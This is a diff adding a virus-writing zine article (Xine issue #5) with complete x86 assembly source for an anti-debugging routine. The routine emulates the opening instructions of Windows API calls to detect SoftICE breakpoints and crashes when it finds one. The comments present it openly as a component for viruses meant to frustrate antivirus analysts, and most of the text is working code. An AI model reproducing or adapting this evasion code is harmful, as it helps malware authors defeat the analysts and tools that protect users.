@@ -1,0 +1,344 @@
+
+
+                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                             ³ Xine - issue #5 - Phile 302 ³
+                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+
+
+
+;
+;       Well, i hope you've read my lil doc about anti debugging. 
+;
+;       This code shows how to make it more difficult for AV's to breakpoint
+;       the API's you use.
+;
+;       *How it works:
+;
+;       *Functional:
+;
+;       Well, a breakpoint (in softice) is just an INT3 on the entry of the
+;       API. You say 'bpx loadlibrarya' to softice, softice looks in the dlls
+;       defined in winice.ini for loadlibrarya, and it puts an INT3 there.
+;
+;       The following code looks for an INT3 in the API you call, not only
+;       on the start of the api, but it traces and emulates into the API,
+;       so AVs have something more to do.
+;
+;       *Technical:
+;
+;       In your virus you normally have a table, filled up with RVA's of the
+;       APIs you wanna use. They are all 4 bytes, all are 'apiname dd 0h'.
+;
+;       With this code you have to do it in another way: In stead of
+;       'apiname dd 0h', you have 'Apiname equ entrynumber'. Well, entry no.
+;       is an entry into the api table. 0 is api 0, 1 is api 1, etc.
+;
+;       You use the macro 'calls' in this way: calls apiname. the macro named
+;       "calls" creates this code:
+;
+;       call    stealthcallapi          ;the normal sub
+;       db      apinamenumber
+;
+;       So lets say you want to call the 3th entry in your table, because
+;       it is messageboxa
+;
+;       you have somewhere the equ      'iMessageBoxA equ 3'. You do a
+;       'calls iMessageBoxA', and the result is
+;
+;       call    stealthcallapi
+;       db      3
+;
+;       mmm ok? i'm not good at explaining things but i'm doing my best ;)
+;
+;       oki, stealthcallapi checks the byte after the call (so you are
+;       "limited" to 256 API's ;), it looks up the offset in the table, and
+;       then it is going to look around a bit into the api code. It emulates
+;       the found opcode. If the found opcode is an int3, it will halt the
+;       PC. If the humble disassembler isn't able to disassemble/trace further,
+;       it will continue to execute the real code of the api at the point
+;       where it got lost.
+;
+;       it is also possible to call a normal routine, using callapi, and in
+;       eax you have to put the offset of the code you wanna execute.
+;       
+;       *Weak point(s)
+;
+;       AV can breakpoint on the place where the tracer returns to the real
+;       API code. Not very dangerous, but he can look for the return add. on
+;       the stack, to breakpoint after the stealthcallapi-call. So it can be
+;       smart to do a checksum of your code everytime you call stealthcall
+;       api (insert the checksum code there). With checksumming you can find
+;       INT3's in your code, and crash it...
+;       
+;       mmm.. i hope you understood it ;)
+;
+;       lifewire / being a proud member of IKX
+
+.386p
+.model flat
+
+        extrn ExitProcess:PROC;
+        extrn GetModuleHandleA:proc;
+        extrn GetLastError:proc;
+
+calls   macro   function                ;api stealth macro
+        call    stealthcallapi
+        db      function
+endm
+
+LoadLibraryA    equ     0
+GetProcAddress  equ     1
+
+;----------------------------------------------------------------------------;
+_CODE   segment dword use32 public 'CODE'
+
+start:
+        int     3
+
+        xor     ebp,ebp
+
+        push    offset namepje 
+        calls   LoadLibraryA
+
+        push    offset nametoimport
+        push    eax
+        calls   GetProcAddress
+      
+        push    0
+        push    offset namepje
+        push    offset namepje
+        push    0
+        call    callapi                 ;messageboxa
+
+        int     3
+
+        Push    0
+        Call    ExitProcess
+
+namepje db      "user32.dll",0          ;name of dll to loadlib.
+nametoimport    db      "MessageBoxA",0 ;name of api to call
+
+db      "LW-AT-"
+db      (offset  endtracer-offset stealthcallapi)/100 mod 10 + "0"
+db      (offset  endtracer-offset stealthcallapi)/010 mod 10 + "0"
+db      (offset  endtracer-offset stealthcallapi)/001 mod 10 + "0"
+
+;----------------------------------------------------------------------------;
+;
+; Works a lil like VxDCall works:
+;
+; Needs function byte after the call... when called, esp points to the return
+; address so its quite easy to get it.
+;
+; And this one gets the address of the api & calls 'callapi' with the address
+;
+stealthcallapi:
+        mov     eax,[esp]               ;return adress
+        inc     dword ptr [esp]         ;increase return add
+        movzx   eax,byte ptr [eax]
+        mov     eax,dword ptr [ebp+apitbl+eax*4]
+
+;----------------------------------------------------------------------------;
+;
+; This routine emulates a part of the api that is called, so BPX's at API's
+; (e.g. BPX GetModuleHandleA) will be caught... and often something as
+; BPX GetModuleHandleA+1 too... until the emulated opcode isn't understandable
+; for the emulator... then it 'jmps' to the offset inside the API where the
+; emulator got lost...
+;
+; It emulates pretty long, in NT, 9x, 2k & ME an average of 5 instructions.
+; not bad for such small code, erh?
+;
+; use it in your own code too, its annoying for AV's I hope :)
+;
+; (Breaking API's is less easy, your source looks good or even better, and
+;  the result is even anti disassembling/debugging because the calls don't
+;  really return after the call opcode, and even while tracing in softice
+;  it sucks because you can't just press f10:)
+;
+; emulates the most common opcodes you find at the start of an API:
+;
+;       sub     reg32,samereg32 (often used to zero a reg (EDX) for SEH)
+;       push    reg32           (often a push edi)
+;       push    byte
+;       push    dword           (often the address of a SEH-handler)
+;       mov     reg32,reg32     (often ebp,esp, and more)
+;       nop
+;       int     3               (if found it's time to crash)
+;       mov     dword ptr fs:[reg32],esp  (SEH)
+;       push    dword ptr fs:[reg32]      (SEH)  
+;
+;
+;
+; Needs         EAX : START OF CODE
+;
+
+callapi:
+
+        mov     ecx,ebp
+        lea     ebp,[ebp+regstate]
+        mov     [ebp+3*4],ebx                   ;save the preserved registers:
+        mov     [ebp+5*4],ecx ;ecx=ebp          ;ebx,esi,edi and ebp
+        mov     [ebp+6*4],esi                   
+        mov     [ebp+7*4],edi
+
+traceapi:
+        mov     [ebp+4*4],esp                   ;only esp isn't emulated but
+        movzx   ebx,word ptr [eax]              ;real..
+
+        cmp     bl,02bh
+        je      subsomething
+
+        cmp     bl,50h                          ;push reg  = 50 .. 57
+        jb      WeAreLost                       ;push byte = 6a
+                                                ;push dwor = 68
+        cmp     bl,58h
+        jb      pushregister
+
+        cmp     bl,6ah
+        je      pushbyte
+
+        cmp     bl,68h
+        je      pushdword
+
+        cmp     bl,08bh
+        je      movreg
+
+        cmp     bl,90h
+        je      nopje
+
+        cmp     bl,0cch                         ;wooh ;) a breakpoint
+        je      killhim
+
+        cmp     bl,064h
+        je      maybesomethingwithseh
+
+        jmp     WeAreLost
+
+pushregister:
+        movzx   ebx,bl
+        sub     bl,50h
+        push    dword ptr [ebp+ebx*4]
+        inc     eax
+        jmp     traceapi
+
+pushbyte:
+        movzx   ebx,bh                          ;ebx = dword<-byte to push
+        push    ebx
+        inc     eax
+        inc     eax
+        jmp     traceapi
+
+pushdword:
+        push    dword ptr [eax+1]
+        add     eax,5
+        jmp     traceapi
+
+nopje:
+        inc     eax
+        jmp     traceapi
+
+killhim:                                        ;bye bye av
+        xor     eax,eax
+        mov     fs:[eax],eax
+        xor     esp,esp                         ;doesn't reveal too much even
+        jmp     esp                             ;with FAULTS ON (empty stack)
+                                                
+subsomething:
+        cmp     bh,0c0h
+        jb      WeAreLost
+
+        mov     ch,bh
+        and     ch,111000b
+        and     bh,111b
+        shr     ch,3
+        cmp     bh,ch                           ;are src- & dst-reg the same?
+        jne     WeAreLost
+
+        movzx   ebx,bh
+        xor     ecx,ecx
+        mov     dword ptr [ebp+ebx*4],ecx
+        inc     eax
+        inc     eax
+        jmp     traceapi
+
+movreg:
+        cmp     bh,0c0h
+        jb      WeAreLost
+
+        mov     ch,bh
+        and     ch,111000b
+        and     bh,000111b
+        shr     ch,3
+        movzx   ecx,ch
+        movzx   ebx,bh
+
+        push    dword ptr [ebp+ebx*4]
+        pop     dword ptr [ebp+ecx*4]
+
+        inc     eax
+        inc     eax
+        jmp     traceapi
+
+maybesomethingwithseh:
+        mov     bx,word ptr [eax+1]
+        cmp     bl,0ffh
+        je      pushfssetupseh
+
+        cmp     bx,2289h
+        jne     WeAreLost
+
+        mov     dword ptr fs:[0],esp
+        add     eax,3
+        jmp     traceapi
+        
+pushfssetupseh:
+        sub     bh,30h
+        cmp     bh,8
+        ja      WeAreLost
+
+        push    dword ptr fs:[0]
+        add     eax,3
+        jmp     traceapi
+
+WeAreLost:
+
+        push    eax                             ;eax = place to jmp, but
+                                                ;eax may have another value
+        mov     eax,[ebp+0*4]
+        mov     ecx,[ebp+1*4]
+        mov     edx,[ebp+2*4]
+        mov     ebx,[ebp+3*4]
+        mov     esi,[ebp+6*4]
+        mov     edi,[ebp+7*4]
+        mov     ebp,[ebp+5*4]                   ;ofcourse as last!
+
+        ret                                     ;place to jmp
+endtracer:
+;----------------------------------------------------------------------------;
+
+                ;fill in this table with offsets of apis...
+                ;(it is virus orientated)
+
+apitbl:
+        dd      0bff776d0h                      ;LoadLibraryA
+        dd      0bff76da8h                      ;GetProcAddress
+
+regstate db     8 dup (012h,34h,56h,78h)
+
+
+apiend:
+
+_CODE   ends
+;----------------------------------------------------------------------------;
+
+;----------------------------------------------------------------------------;
+_DATA   segment dword use32 public 'DATA'
+fill    db      ?
+_DATA   ends
+;----------------------------------------------------------------------------;
+
+end     start
+end
